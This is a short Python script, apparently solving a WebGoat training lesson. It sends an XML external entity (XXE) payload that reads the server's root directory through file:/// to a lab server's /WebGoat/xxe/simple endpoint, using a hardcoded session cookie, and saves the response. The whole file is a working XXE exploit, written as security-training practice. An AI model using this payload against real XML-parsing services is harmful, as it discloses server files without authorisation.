import requests
from os.path import abspath, dirname


base_url = "http://10.1.121.141:8080"
cookie = {"JSESSIONID":"CA022FA656A2740E47503559256EB92D"}
result_file_name = "xxe3.txt"

relative_url = "/WebGoat/xxe/simple"
result_file_path = dirname(abspath(__file__)) + "\\" + result_file_name

xml = '<?xml version="1.0"?> <!DOCTYPE comment [ <!ENTITY rootpath SYSTEM "file:///"> ]> <comment><text>&rootpath;</text></comment>'
headers = {'Content-Type': 'application/xml'}

url = base_url + relative_url

r = requests.post(url, data=xml, headers = headers, cookies=cookie)
with open(result_file_path, 'w') as file:
    file.write(r.text)